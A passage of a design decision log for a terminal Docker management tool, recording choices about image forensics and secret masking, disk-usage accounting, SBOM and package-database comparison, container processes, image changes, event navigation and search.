without trusting the desk's judgement.

### F7 — Instructions map only by exact count

**Decided:** history entries with `empty_layer` false are matched to the layers in order, and
only if there are exactly as many as there are layers. Otherwise no finding carries an
instruction, and a note says why. A build argument's value never appears in an instruction:
`RUN |1 NPM_TOKEN=… /bin/sh -c …` is shown as `RUN … (build args: NPM_TOKEN)`, and any
secret-shaped text left in it is masked.

**Why:** the request's rule. A history rewritten by squashing, or images whose history was
stripped, do not map, and an off-by-one would put the wrong instruction beside every finding.

### F8 — What is reported for deleted and replaced files

**Decided:** for every path, the desk decides from later layers' whiteouts, opaque markers and
path fingerprints whether that version is still visible at the end, deleted (by which layer)
or replaced (by which layer). Secrets are reported in every case — `secret.deleted` and
`secret.overwritten` say the bytes are still in the earlier layer. Caches and build junk are
reported in every case too, and say when they were cleaned one layer too late. Special modes
(setuid, setgid, world-writable, capabilities) and binary hardening are reported only for
what a container would see.

**Why:** a deleted secret is the reason the tab exists — anyone who pulls the image has the
layer. A deleted cache still costs its bytes. A setuid binary that a later layer removed
cannot be executed in a container; reporting it would be noise.

### F9 — Secrets never leave the screen

**Decided:** a secret's value is held only in `forensics.Secret`, whose every formatting path —
`String`, `GoString`, `Format` (all fmt verbs), `MarshalJSON`, `MarshalText` — yields
`[masked]`. Only `Reveal` returns it, and only the Findings tab calls it, for the one finding
under the cursor after `v`. The reveal ends when the cursor moves, the order changes, the pane
loses focus, or `v` is pressed again. Evidence is always masked (`AKIA************ (20 chars)`).
Analysis errors are the desk's own sentences (`analysisError`) and never quote the archive; a
panic during analysis becomes a fixed message. The job logs counts and digests only. The
opt-in real-daemon test logs rule counts, not evidence.

**Alternative:** keep no value at all and show only the mask.

**Why:** "is this the real key or the example one?" often decides what to do next, and the
request asked for a reveal. A type that cannot print its value makes "never in a job record,
an error, a file or a diagnostic" a property of the code, not of care at each call site.
`TestSecretsNeverPrint`, `TestASecretNeverLeavesTheScreen` and `TestBrokenInputFailsInItsOwnWords`
check it.

**Cost:** a revealed value is on the screen, and so in the terminal's scrollback until the next
frame replaces it. The screen captures in `docs/screens` are taken with nothing revealed.

### F10 — One analysis at a time, cached by image ID and platform

**Decided:** the analysis starts when the tab is open on an image whose inspect has arrived
(the platform comes from it), once the highlight has settled. It runs as a job titled
"analyse image" with progress in bytes read and layers found, and `c` (in the tab or in the
Jobs pane) cancels it. Moving to another image with the tab open cancels the running analysis
and starts the next: at most one archive streams at a time. Reports are kept for the eight
most recently used image-and-platform keys; reopening one draws it in the same frame, with no
request. A failed or cancelled analysis is not retried by itself; Enter retries.

**Why:** browsing with the tab open must not open a stream per row. The image ID is a content
address, so a report for an ID and platform never goes stale; only the live half changes, and
it is recomputed whenever the pane is drawn.

### F11 — A remote image above 500 MB waits for Enter

**Decided:** when the daemon is remote (the same test as the header's `[REMOTE …]` tag, R12)
and the image is larger than `Options.FindingsAskAbove` (500 MB by default), the tab says how
large the image is and where the daemon is, and requests nothing until Enter.

**Why:** the request asked for a size threshold; 500 MB is a few minutes on a slow link and a
moment on a fast one, so it catches the transfers worth deciding about. The prompt is in the
tab, not a dialog: dialogs are for mutations, and this is a read that costs only time.

### F12 — The live join: what is inspected, and what is not claimed

**Decided:** containers come from the list (state, ports, network mode — the list now carries
`HostConfig.NetworkMode`). What only inspect tells — privileged, user, and the reference a
container was created from — is fetched for at most 20 containers: those using the image, and
those whose listed image is an ID (the list shows an ID once the tag has moved). It is
refetched when the container list changes. Live findings: privileged (with root from the
image, from the desk), host network, ports published on every interface, created from a tag
rather than a digest, the tag moved since the container was created (either way), no registry
digest, and secrets in the final filesystem of an image that has running containers.

**Why:** these are what "joined with what the engine is running now" can say without
guessing. Nothing is said about a container not yet inspected.

### F13 — Rules that were left out, or softened, and why

- **No vulnerability database.** Go module versions are listed; whether one is vulnerable is
  the finding's "unknown". Consulting a database would need the network or a new dependency.
- **zstd layers are not walked.** The standard library has no zstd decoder and the request
  rules out new dependencies; such a layer is hashed and reported as unreadable, and every
  cross-layer conclusion that depends on it says it is unknown.
- **Stack canaries** are judged only for dynamically linked executables whose string table is
  within the bytes read, and never for Go programs (which do not use them). Static binaries
  are not judged.
- **Generic `NAME=value` matches in files packages ship** (`/usr/…`, `/etc/ssl`, `/etc/pki`)
  are hints: the first export of a real Alpine image found `secret = pass:…` in
  `/etc/ssl/openssl.cnf`, OpenSSL's own example. Credential-shaped values (keys, tokens) keep
  their certainty there.

### F14 — Proof against a real daemon, read-only

**Decided:** `make real-readonly-check` now also runs `TestRealDaemonExportReadOnly`: it
exports the smallest image under 300 MB through a read-only engine and analyses the archive
the real daemon wrote. It was run once during the build (Alpine, OCI layout, its layer hashed
to the config's diff ID).

**Why:** the fixtures are written from the specifications; one real archive checks the
reading of them.

## Round five — Space

The request: a view that accounts for what this engine holds on disk, separates shared from
unique bytes, and says what removing one object frees. Fixed by the request: GET requests
only, apart from what already existed; read-only mode stays correct; never present an
estimate as a measurement and say which numbers are the daemon's; do not recompute what the
daemon reports; no Docker prune endpoint, no force, no new delete path; no new dependency;
the existing safety, layout, remote and theme tests untouched. Where it left a choice open,
the choice is recorded here.

### U1 — Totals: one `GET /system/df`, as a job, shown as the daemon states them

**Decided:** `engine.DiskUsage` calls the client library's `DiskUsage` with all four types
and `verbose=1`. The view runs it as the job "measure disk usage" when it opens without a
current account, and again on `r`; `c` cancels it. The four totals — count, active count,
size, reclaimable — are printed with the docker CLI's own size format (go-units `HumanSize`:
four significant digits, powers of 1000) and its reclaimable column (a percentage, except
for build cache), reimplemented in eight lines (`cliSize`), so that they read character for
character like `docker system df`.

**Alternatives:** the desk's own `humanBytes` (one decimal) — the figures would be the same
bytes and look different from the CLI's, which is a comparison the operator will make;
importing go-units — already in the module graph, but as an indirect requirement, and the
request rules out new dependencies; non-verbose df plus the image list with `shared-size` —
two requests at two moments for one account.

**Why:** the daemon has done the adding up; the view's job is to show it. Below API 1.52 the
daemon states no totals and returns lists only; the client library then sums them, exactly
as the CLI does. The engine marks such an account `Derived`, and the view says "summed by the
client library from the daemon's lists (API < 1.52 states no totals)" in place of "daemon".

**Cost:** the daemon answers df by walking every container's writable layer and every local
volume. That is why it is a job, why nothing but the view (and its `r`) asks for it, and why
it can be cancelled.

### U2 — Unique is the daemon's size less its shared size; nothing total is called freeable

**Decided:** per image, the daemon's `Size` and `SharedSize` from the account; unique is the
difference, which is the CLI's UNIQUE SIZE column. "Alone" for the highlighted image is that
figure. Reclaimable is introduced as "the daemon's estimate", with the note that nothing is
freed until something is removed and that, with the containerd image store, the bytes go
when its garbage collector runs. No line anywhere says that an image's size is what removing
it frees. The prune preview's old headline — "Exactly these 2 will be deleted (about …)", the
sum of the listed images' sizes — lost its sum: images share layers, and the sum counted
those bytes once per image.

### U3 — Sharing is by chain ID; layer sizes come from the history, mapped by exact count

**Decided:** `internal/space` (pure code). An image's layers are its diff IDs from inspect;
their chain IDs are computed as the OCI specification defines them. The daemon stores a layer
under its chain ID, so two images hold the same bytes exactly where their chain IDs are
equal — the same layer on a different base is a different chain. Each layer's size is the
daemon's own figure from the image's history (`GET /images/{id}/history`), mapped onto the
layers only when that cannot be wrong: as many sized entries as layers, or every entry a
layer (as F7 does with instructions). An image's layers are read once per image ID and kept —
the ID is a content address — and dropped when the image goes. Then each image's layer sizes
are checked against the daemon: they must add up to its `Size`, and the shared ones to its
`SharedSize`. An image whose layers do not add up (the containerd store counts content the
history does not) has its layers left unattributed, says so, and keeps the daemon's figures.

**Alternatives:** solving for the shared sets from the daemon's per-image `Size` and
`SharedSize` alone — two equations per image, underdetermined as soon as images branch at a
point no image sits on; the Findings archive — file content, not on-disk size, and only for
analysed images (it is used, but for attribution, U6).

**Why:** "shared bytes listed once, against the set of images that hold them" needs to know
which bytes, and both halves of that are the daemon's own statements. The check is what
makes the sum safe to show.

**Found during the build:** against this machine's Docker 29 (read-only,
`TestRealDaemonDiskUsageReadOnly`), the history mapped for all 18 images and added up for
none. With the containerd image store the daemon's `Size` and `SharedSize` count each
layer's compressed content as well as its unpacked snapshot; the history gives the snapshot
alone, rounded to 4 KiB blocks (a one-layer image: shared 12,938,037 B, snapshot
9,084,928 B). No per-layer content size is available without reading manifests, so there the
check refuses, as it should: the view names which images share layers, shows `?` for how
much, keeps every daemon figure, and gives "together" as a floor. On the classic store
(overlay2) the history's sizes are the layer store's own and add up.

### U4 — What a set frees, and when that is not known

**Decided:** removing a set of images frees the bytes of every layer all of whose holders
are in the set. It is exact when every such layer's size is confirmed (U3) and every image the
account lists has its layers read. Otherwise the figure is "at least" the sum of the members'
unique sizes (the daemon's), with the reason; and if not even that is known, it says so.
"Together" for the highlighted image is the image and every image holding one of its layers.

**Why:** a lower bound from the daemon's own figures is a measurement; a guess at the rest is
not. In the demo, the debian base links eight images, so "together" for any of them is the
whole cluster — which is what the definition says, and the names are listed.

### U5 — Writable layers come only from `size=1`, only when asked

**Decided:** `engine.ContainerSizes` lists containers with `all=1&size=1` (optionally only some
IDs). The view calls it only from `m`, as the job "measure writable layers"; `c` cancels it.
No list refresh, no confirmation, nothing automatic asks for it. The df answer also carries
per-container items; they are not shown.

**Why:** one source per figure, as the request names it: a container's writable layer read
in two places at two moments would show two ages for one number.

### U6 — Archive attribution is read from the Findings cache, never from an archive

**Decided:** for an image with a cached Findings report (the cache is looked at, never filled,
and no analysis is started), the detail line gives the report's size by layer and the largest
layer with its instruction — or says that the history does not map, so no instruction is
named. It is labelled "of file content" and "archive": it is the bytes of the files in each
layer tar, a different measure from the daemon's on-disk size. The report's time is recorded
when it is cached (`findingsState.storedAt`).

### U7 — Every figure has a source and an age; stale means "the engine changed since"

**Decided:** sources are `daemon` (or the client library's sums, U1), `computed writable
layer`, `computed from layer sizes`, and `archive`; each section and detail line names its
source and age, and the box title the account's clock time. The desk records when a refresh
last found the engine different from what it knew — a list whose objects (and, for
containers, states) differ, or a new account whose totals differ from the last — and any
figure taken before that moment is labelled STALE.

**Alternative:** stale when older than the last refresh of any kind. The lists refresh every
five seconds and on every engine event, so every figure would be stale almost at once and the
word would mean nothing.

**Why:** a refresh that finds nothing changed is evidence that the figure still holds. One
that finds anything changed is not proof that it does not, which is exactly what "stale"
says. `r` in the view re-reads the account and the lists together; the writable layers,
measured before a change, stay stale until measured again.

### U8 — The view is a layer between the desk and its dialogs

**Decided:** the view is not a dialog. It is drawn over the body, under the header (the daemon
stays named); a dialog opened from it is drawn over it. Keys go to an open dialog first, then
to the view; nothing reaches the panes behind it. `S` opens it from any pane — except while a
filter is being typed, where S is a letter — and `S` or Esc closes it. The desk underneath is
not touched while it is open, and focus, kind and highlight are also saved and put back.

**Why:** "in the style of the help screen" (a box with a scroll position and its keys below),
but able to open the desk's own confirmations without closing, which a dialog could not:
only one dialog is open at a time.

### U9 — Enter goes to the object

**Decided:** on an image, container or volume row Enter closes the view and highlights the
object in its own kind, the List focused. A filter that would hide it is cleared and the
status line says so. Build-cache records and shared-layer lines are not rows: the desk has no
kind for the first, and the second is a set, not an object.

### U10 — Reclaim only through the existing confirmations, which now say what they free

**Decided:** `d` in the view invokes the kind's own remove action on the highlighted object,
`X` the kind's own prune (images, volumes); both go through `invokeOn`, so the selection
rules, the read-only refusal and the arming delay are the same code. A selection made in the
List is not used from here: in the view, `d` means the object it highlights. For an image with
several references, `d` opens the untag of the first, which says it frees nothing. Every
remove and prune confirmation, wherever it is opened from, gains a "frees" line, computed
from the view's last account — no request is sent for it — with its source and age:

| Plan | frees |
| --- | --- |
| remove an image | its unique size |
| untag | nothing — the image stays under its other references |
| several images (prune, selection) | the set's figure, U4 |
| remove containers | their measured writable layers, or "not measured — m measures" |
| remove volumes | their sizes from the account |
| no account yet | "not measured — S opens Space" |

**Alternative, tried and dropped during the build:** measuring at the moment of the
confirmation (`GET /images/json?shared-size=1`; `size=1` for the one container). The second
would put a filesystem walk outside the job U5 confines it to, and with the containerd store
the first walks snapshots too. A figure from the account, labelled with its age and STALE when
the engine has changed since, is honest and costs nothing.

### U11 — Read-only mode: every figure, no reclaim

**Decided:** in read-only mode the view and both measurements work (they are GETs), and `d`,
`X`, their hints and their help lines are absent; the keys do nothing.

### U12 — The fake daemon learns layers

**Decided:** fake images carry layers (bottom first) whose identity is a name; equal names on
equal bases are equal chain IDs, and `SharedSize` is computed from them. An image seeded with
a size alone keeps two layers of its own that add up to it. The fake serves image history
(with an empty-layer `CMD` entry on top, to exercise the mapping), `shared-size=1` (and `-1`
without it, as the daemon), `size=1` on the container list, and `/system/df` in both shapes —
totals and items from API 1.52, the legacy lists below it, chosen by the version in the path.
Volumes have sizes, there are build-cache records (reported only; the fake has no builder),
and `DiskUsageDelay`, `SizeDelay` and `AdvertiseAPI` make the slow paths and old daemons
testable. The demo's images now share what real ones do: a debian base under nginx, postgres,
redis, python and ghost; alpine under node; python under the worker, node under the API, and
the two dangling images are earlier builds of the worker and the blog. Sizes seeded before
are kept, so the Images list shows the same figures for those.

**Cost:** the demo's images other than those have new sizes, so every captured screen was
regenerated; and `TestInspect` expected nginx to have the old fake's fixed two layers — it
has three now.

### U13 — Proof that the totals are the daemon's

**Decided:** `scripts/cli-crosscheck.sh` checks the real `docker system df`, `system df -v`,
`ps -s` and `history` against the fake. `TestSpace` (end to end) runs the real
`docker system df` against the same fake as the real binary and requires every size and
reclaimable figure on the screen to match; `TestSpaceTotalsAreTheDaemons` also proves that
the unique sizes and the shared groups add up to the daemon's image total — each byte once.

## Round six — container processes

The `container-process-view` change: a read-only Processes tab for containers. Where the
change left a choice open, it was decided here without stopping to ask.

### P1 — Tab position: after Stats, before Inspect

**Decided:** `Info Logs Stats Processes Inspect`. Processes is a running-container view like
Logs and Stats, and Inspect stays the last, everything-else tab. **Cost:** Inspect is one `]`
further; `TestDetails` and the e2e tab walks were updated for that.

### P2 — Every entry to the tab takes a fresh snapshot

**Decided:** entering Processes (from another tab or kind) invalidates the snapshot, as does
`r` anywhere; the snapshot shown is fetched again only when invalid, for a new container, or
after a reconnect. The design lists "the tab is newly entered" as a trigger, and a snapshot
kept across an absence of unknown length would read as current. Rows of the same container
stay on screen while the new one loads ("refreshing…"); rows of another container never do.
**Alternative:** cache across visits until `r` — fewer requests, older data presented as if
fresh.

### P3 — Not running means `State == running`

**Decided:** only a running container is asked; paused, restarting, created and exited ones
show the "available only for running containers" message without a request (the spec names
paused). A 409 answered by the daemon is shown as "no longer running". When the list later
says the container stopped, rows are dropped. A different error replaces rows with the
daemon's message in the pane; an unreachable daemon keeps rows already shown and marks them
stale, and they are taken again after reconnection.

### P4 — Table layout

**Decided:** columns are the daemon's titles; every column but the last is as wide as its
widest value, capped at 24 cells; the last (the command, for `ps`) takes what is left; the
whole row is then cut to the pane. Missing cells are empty; extra cells are joined into the
last column with spaces so nothing is silently dropped. Escape sequences are stripped and
control characters become spaces so no value can move the cursor or break a row. The header
stays on top; rows scroll with the existing Details keys; `w` does nothing on this tab.

### P5 — Fake daemon listing

**Decided:** the fake answers `/containers/{id}/top` like dockerd on Linux: `ps -ef` columns,
the container command as the first process and a shell child unless `NoShell`, PIDs derived
from the creation time (deterministic); 404 for unknown and 409 for non-running containers;
`SetProcesses` fixes any table, including empty and ragged ones, for tests.

## Round seven — image packages

The `image-packages` change: what an image's SBOM declares, against what its own package
databases say is installed, browsable in a full-screen view opened with `i` from Images ›
Findings. Where the request left a choice open, it was decided here without stopping to ask.

### K1 — Every JSON blob is scanned as it streams, by the desk's own lexer

**Decided:** which blob is the SBOM is known only from `index.json`, which may come last, so
every JSON blob passes through a scanner while it streams (and is still kept whole when it fits
the old 4 MiB bound). The scanner is a small JSON lexer of the desk's own: a string keeps at most
2 KiB and the rest is read and dropped; nesting stops at 64; a literal at 512 bytes. It reads
SPDX `packages[]` (name, versionInfo, licenseDeclared then licenseConcluded, the purl among
externalRefs) and CycloneDX `components[]` with nested components (name, version, purl,
licenses), at the top level or under `predicate`. **Alternative:** `encoding/json`'s `Decoder`
with `Token()` — it buffers each token whole, so one 100 MB string in an SBOM would be held in
memory; the bound would be a hope. **Cost:** a second JSON parser in the code base; it is tested
against escapes, surrogate pairs, cut-off and malformed documents, and depth.

### K2 — rpm's database: a read-only SQLite reader that walks table b-trees and nothing else

**Decided:** the reader takes the file whole from memory (bounded at 64 MiB), checks the header
(page size, reserved bytes, payload fractions, UTF-8, the page count where the header keeps one),
finds `Packages` in `sqlite_master` (page 1, itself a b-tree), and walks interior and leaf table
pages, assembling payloads through overflow chains and decoding records. Each page may be visited
once per walk; any page number, offset or length outside the file, an index page in a table
tree, an overflow chain that ends early or runs on, a malformed varint or record — fails the
whole read. A `recover` is a net under that, and the fuzz and mutation tests call the reader
without it, so a fault its checks miss is found rather than caught. **Alternative:**
`modernc.org/sqlite` — a large dependency the request rules out.

### K3 — rpm headers: tags 1000–1003, 1014, 1022; the first entry of a tag counts

**Decided:** a blob is `il`, `dl`, `il` index entries, the store, with rpm's own bounds (at most
65,535 entries, 256 MiB of data). STRING, I18NSTRING (the first string) and STRING_ARRAY (the
first) are read for strings; EPOCH must be INT32. The version shown is rpm's
`[epoch:]version-release`. `gpg-pubkey` entries are listed, because rpm lists them, and marked
as not packages: they are never undeclared (K7).

### K4 — Which copy counts: `finalFS`, asked per layer

**Decided:** every copy of every database path is captured as its layer streams — with symbolic
links, hard links and other non-files captured as unreadable copies, so that a link over a
database can never leave an older copy looking current. The state "as of layer j" takes, for each
path, the topmost copy at or below j and asks `finalFS` restricted to layers ≤ j whether it is
still visible. Consequences, each tested:

- deleted in a later layer → **unknown** ("the packages it listed may still be on disk"), never
  an empty list;
- a later layer that cannot be read (zstd, a broken tar, a layer missing from the archive) →
  unknown; for dpkg, a layer that cannot be read anywhere makes it unknown, because `status.d`
  files add up across layers; for apk and rpm only a layer above the copy does;
- no copy in any layer and every layer read → **absent**: a declared `pkg:deb` package is then
  declared only, and the header says there is no dpkg database;
- rpm: a non-empty `rpmdb.sqlite-wal` or `-journal` beside the database read → unknown;
  `Packages` or `Packages.db` (Berkeley DB, NDB) → unknown with that reason; two databases
  visible → the one in the higher layer is read and the other named in a note.

`finalFS.fate` learned one thing for this: an ancestor directory replaced by a symbolic link in a
later layer hides what was under it (Fedora's `/var/lib/rpm → ../../usr/lib/sysimage/rpm`). It is
reported as deleted, which is what a container sees; no existing test changed.

### K5 — Layer attribution: the unbroken run of states that list the package

**Decided:** a package's layer is the first layer of the run of states, ending at the last
layer, whose database lists its name, version and architecture. A package removed and installed
again is attributed to the reinstall. A state that cannot be known (a copy that does not parse, a
copy holding more than was kept) breaks the run, and the attribution is marked unsure with the
reason; the view shows `L3?`. The instruction shown is the layer's, where the history maps (F7).

### K6 — The join: by name within an ecosystem, the same version first

**Decided:** `pkg:deb` against dpkg, `pkg:apk` against apk, `pkg:rpm` against rpm, by the purl's
name. Pairs at the same version (and architecture, where both state it) are matched first, then
the same name at another version (version differs). An SBOM that lists one package twice
declares it once. An epoch only one side states, or an epoch of 0, does not make versions
differ: SBOM tools disagree on whether to write it, and a mismatch on that alone would be noise.
rpm's purl `epoch=` qualifier is folded into the declared version.

### K7 — Not checkable, with a reason, whenever either side cannot say

**Decided:** a row is not checkable when its ecosystem is not deb, apk or rpm; when the SBOM
gives no purl; when the installed side is unknown; when the image carries no SBOM, or its SBOM
cannot be read; for `gpg-pubkey`; and — the bounds — an installed package when the SBOM table is
capped, a declared package not found when the installed list is capped. The reason is on the row.
Nothing is called undeclared or declared only on the strength of a capped list.

### K8 — Two findings, from the same join the view draws

**Decided:** `supply.undeclared` (certain, source image) names up to six packages in its
evidence and up to 200 in its detail, gives the database file as its path, and gives the layer
and instruction when all came from one layer. Its unknown says what cannot be known about why.
`supply.sbom-drift` (hint) counts declared OS packages not installed and installed at another
version. `supply.sbom`'s unknown now says which databases the SBOM was checked against, and its
count is read for documents above the JSON bound too.

### K9 — The view is a layer like Space, opened only on a finished report

**Decided:** `i` on the Findings tab opens it once the report exists (before that, the status
line says so). It holds a pointer to the report, so evicting the report from the cache cannot
change it. It changes nothing under it — not the kind, focus, tab, findings cursor, or the status
line (its `o` and `s` say what they did on the view's own line instead) — so `Esc` puts back the
desk exactly; a test compares the screens. With a search active, `Esc` clears it first, as the
list's filter does. `i` closes it too.

### K10 — Header lines scroll, the "showing" line does not

**Decided:** as in Space, the header — the SBOM line, a line per database read, one line per
distinct reason a database is unknown (three managers unknown for one zstd layer is one line),
the bounds hit, the notes, and the counts by state — is the top of the scrolling list. A fixed
line above it says the order, the state shown, the search and how many rows are shown. The view
opens at the top, and `k` or `g` on the first row return there, so a header taller than the list
at 80×24 can always be read. The counts wrap; none is ever cut off.

### K11 — The cursor keeps its package while a filter hides it

**Decided:** the cursor is the package's identity (ecosystem, name, both versions, architecture,
purl). When the state filter or search hides it, the row at the same position is highlighted, but
the package chosen is kept, so it is highlighted again when it is shown again; only moving
chooses another package.

### K12 — The order of `s`: the disagreements first

**Decided:** all → disagreements (undeclared, version differs, declared only) → undeclared →
version differs → declared only → not checkable → both → all; `S` shows all again. Ordering by
state puts undeclared first and both last. Ordering by layer puts rows with no known layer last.

### K13 — The fake daemon's `python:3.12-slim` carries the demo

**Decided:** `shop/api:dev` stays as it was — several tests assert its size and findings. The
fake now serves `python:3.12-slim` from `fixture.DemoPackages`: a Debian base, an apt layer, a
pip layer and a later apt layer the SBOM was made without, so that every state appears. Its
listed size is unchanged.

### K14 — The rpm fixtures, and the real daemon

**Decided:** `testdata/rpm/ubi9-micro.rpmdb.sqlite.gz` is the unmodified database from
`registry.access.redhat.com/ubi9/ubi-micro` (image `sha256:5be877a2…5e6`), gzipped to 865 kB.
ubi-micro has no `rpm`, so what rpm reports for it was taken with ubi-minimal's rpm 4.16.1.3 on a
copy (`--dbpath`), with no network. A second database, written by SQLite itself from
`make_synthetic.py`, has 512-byte pages, deep trees, 40 kB headers, freed pages and epochs; a
tiny one seeds the fuzz test. `TestRealDaemonPackagesReadOnly` (in `make real-readonly-check`)
analysed ubi-micro from this machine's Docker 29.9.2 through the read-only engine and found its 22
entries exactly as rpm reported them.

### K15 — Tests on a clock share the machine: the new tests stay light

**Decided:** `go test ./...` runs packages side by side, and the pseudo-terminal tests pace keys
at 15–30 ms. The new forensics tests first made those fail in most uncached full runs, by
re-reading the 7 MB real database eighty times (JOURNAL §36). The damage test now gives the real
database ten mutations and the small synthetic one eighty, in one reused buffer; fixtures are
decompressed once. **Alternative:** lengthen the e2e waits, or mark the heavy test `-short`-only —
both would have hidden the cost instead of removing it, and the first changes tests this round
had no reason to touch.

## Round eight — image changes

The `image-changes` change: a Changes tab on Containers that says what differs between the
image a container runs and the image its reference names now. Where the brief left a choice
open, it was decided here without stopping to ask.

### C1 — The pair: the container's own reference, resolved among local images

**Decided:** the running image is the container's `ImageID`; the reference is `Config.Image`
from the container inspect the Details pane already makes (the list shows an ID instead once
the tag has moved, so the list cannot be used); the new image is the local image carrying that
reference now, resolved by the same normalisation `supply.tag-moved` uses (exported as
`forensics.ResolveRef`, the rule itself untouched). No registry is asked. **Alternative:**
resolve against a registry — a network call, credentials, and a second meaning of "now".

### C2 — Four requests: one new engine read, `ImageFacts`

**Decided:** opening the tab costs an inspect and a history per image (`ImageFacts`, two GETs),
so four at most; the facts are kept by image ID (sixteen), which never changes meaning, so a
second visit costs nothing. A refusal known from the list alone (pinned, created from an ID,
unresolved, the same image) costs two. `ImageFacts` has no `Raw` document and decodes
environment variables to their names (`engine.EnvNames`): values never leave the engine
package, so no view, job, error or log can show one. **Alternative:** reuse `InspectImage` —
its `Raw` carries every value.

### C3 — Lineage from diff IDs; instructions only where history maps

**Decided:** the shared part is the longest common prefix of the ordered diff IDs. Either the
base is intact (every running layer starts the new stack) and *N added*, or the stacks diverge
after layer k (k may be 0). Instructions and sizes are attributed by Space's rule (U-round):
only when exactly as many history entries made a layer as there are layers, or when every
entry did; otherwise *unknown*, with the counts. Instructions go through the findings'
`cleanInstruction` (exported as `forensics.Instruction`): build-argument values are left out
and secret-shaped text masked.

### C4 — The config difference, and what it cannot see

**Decided:** entrypoint, command, user, working directory and health check as single values
(added, removed, changed); exposed ports and environment names as sets; labels by key, with
values (labels are not secrets in Docker's model, and the brief limits the no-values rule to
the environment). A variable whose value changed under the same name cannot be seen — the tab
says so on every draw rather than hint at it.

### C5 — Content comparison: the Findings analysis, twice, as one job

**Decided:** `Enter` starts *compare images*, which streams the archive of each image that
Findings has not already analysed for that platform, through the same `forensics.Analyse`
with the same limits, one after the other. The reports go into Findings' cache, so either
tab then opens instantly. Only counts, short IDs and the desk's own words are logged.
**Alternative:** a separate cache — two copies of the same report.

### C6 — Packages by ecosystem, name and architecture

**Decided:** for each of dpkg, apk and rpm present on either side: added, removed, and
version changed (same name and architecture). A database unknown on either side, or bounded
below its total, is not compared and says why; rpm's `gpg-pubkey` pseudo-entries are skipped.
Added packages carry the layer that introduced them.

### C7 — Findings match by rule, path and evidence; layer findings by instruction

**Decided:** a finding's identity across two images leaves the layer number out (a rebuilt
layer moves), and a layer-group finding is matched by its instruction because its evidence is
a share of the whole image's size, which any added layer changes. Live findings are not
compared: they describe this daemon, not either image. Masked evidence stays masked.

### C8 — Every refusal, with its reason

**Decided:** in order: created from an image ID; pinned to a digest; the tag no longer
resolves here; the same image on both sides — all from the list; then different platforms
(from the facts); then an unreadable or missing layer in either archive (from the reports),
which refuses the whole content comparison, because anything seen on one side only could be
in it. Each is one sentence on the tab, and none offers an action.

### C9 — Restart is not re-create, said every time

**Decided:** every state of the tab ends with the same line: restarting keeps the image a
container runs, only re-creating takes the new one, which this desk does not do. No button,
no key, no score.

### C10 — Keys: the existing ones

**Decided:** `Enter` compares (it already means "read the expensive thing" on Findings), `c`
cancels (as on Findings; the Jobs pane's `c` works too), the movement keys scroll. Moving to
another container while the tab is shown cancels a comparison in flight, as Findings does.
Text wraps at spaces only, so instructions and argument lists keep their hyphens.

### C11 — The fake daemon: one moved tag in the demo, every refusal behind `-changes`

**Decided:** `SeedDemo` gains `acme/report:1.4` in two builds and `report-job` (exited) on the
older: the base kept, two layers added (curl and fonts, a purge, an upgrade; a token-bearing
config file), user, command, port, health check, labels and variable names changed.
`SeedChanges` (and `fake-dockerd -changes`) adds a container for every refusal and one rebuilt
on another base; it is not in the demo so its lists stay readable. `SetImageFixture` makes
inspect, history and the archive agree, with diff IDs from the fixture's real layer tars.
**Cost:** the demo has one container and two images more: counts in engine, UI and e2e tests,
the tab walks (`]` presses) and every screen capture were updated — nothing else in them.

### C12 — Where the tab sits

**Decided:** `Info Changes Logs Stats Processes Inspect`, as the brief asks. **Cost:** Logs is
one `]` further, so tests that walked to it by count press it twice.

## Round nine — event navigation and the held view

The Events pane gains a hold and a cursor, and `Enter` on a held event goes to its object. Where
the brief left a choice open, it was decided here without stopping to ask. No OpenSpec change
was opened: the brief asked for the capability specs themselves to be edited
(`engine-events`, `object-selection`).

### E1 — The hold is a copy, not a position in the ring

**Decided:** holding copies all of `Events` (at most 1000 entries) into the model and draws
only that copy; `‖ held +N` counts the ring's appends since (its end minus the end at the copy,
so evicted entries count). The old position-based scroll-back (`evFollow`/`evEnd`) is gone: an
absolute index cannot keep rows still once the ring turns over. **Cost:** up to one extra
history's worth of memory while held. Nothing in `internal/live` changed; the hub does not know
the view is held.

### E2 — Keys at the edges

**Decided:** `PgDn`/`Ctrl+F` stop at the newest held entry and do not resume (only `↓` past it,
`G`, `End`, `Space`, `f` do), so paging down cannot drop a hold by accident. `↓`, `PgDn`, `G`
while live do nothing. `Space` on an empty history holds nothing and says "No events to hold
yet." `Esc` leaves the pane and keeps the hold; so does a jump, so `4` returns to the same row.
`Ctrl+B` counts as a read-back key with `PgUp`.

### E3 — Every row has the gutter, live or held

**Decided:** the two-cell gutter is drawn while following too, so columns do not shift when the
view is held. Events are therefore two cells narrower than before.

### E4 — Which row an event means

**Decided:** images try, in order, the reference in `name`, the actor ID as a reference (a pull's
actor is the reference it pulled; the fake and the daemon put only the repository in `name`),
then the image ID's first row (list order). References are compared exactly, unnormalised.
An event type outside container/image/volume/network, or with no actor ID, has no object.

### E5 — Absent rows always wait; who cancels the wait

**Decided:** a row not found always waits (`Options.JumpWait`, 2 s; tests use 300 ms), even for
a `destroy`: deciding "gone" from the action would be wrong for an ID reused by a re-create of a
volume or network name. The wait marks the list dirty and clears its debounce, so the next
frame asks. It is retried after every update (`afterChange`), expired on the frame tick, and
cancelled by leaving the kind — and, beyond the brief, by any key in the List pane, so a late
row never moves a highlight the operator has already moved. On success the status says
"Found …" unless a filter was cleared (that notice wins). As in the Space view, a filter is
cleared even when the row then turns out to be absent.

### E6 — Space in the Details pane only

**Decided:** `Space` no longer pages in Events; `object-selection` now says Details only and
points to `engine-events` for the Events pane. `TestEventsPane` expects `‖ held +0` where it
expected `‖ +`.

## Round ten — search in the Details pane

`/` in the Details pane: find in Info, Inspect, Processes and Changes; filter in Logs; the
Inspect key path named in the bar. The brief asked for decisions to be made and recorded rather
than asked about; every place it left a choice open has an entry. The change is
`openspec/changes/details-search/`.

### Q1 — Find where the text is a document, filter where it is a stream

**Decided:** one key, two behaviours. Info, Inspect, Processes and Changes *find*: no line is
hidden, matches are marked, `Enter`, `n` and `N` move between them. Logs *filters*: lines that do
not match are hidden, and following and scrolling back work inside what is left. The bar says
which it is doing (`find:` or `filter:`).

**Alternative:** the same behaviour everywhere — filter everything, or find everywhere.

**Why:** a line of an inspect document means something only under its parents —
`"Status": "healthy"` alone does not say whose status; hiding the lines around it removes the
answer to "where is this?". A log line is a record that stands alone, and the question asked of
5000 of them is "show me the ones that say error" — what `grep` answers. Finding in a stream that
keeps moving would also make `n` chase a target that scrolls away under it. **Cost:** two
behaviours behind one key; `n`/`N` do nothing in Logs.

### Q2 — One bar, in the last content row; no row while closed

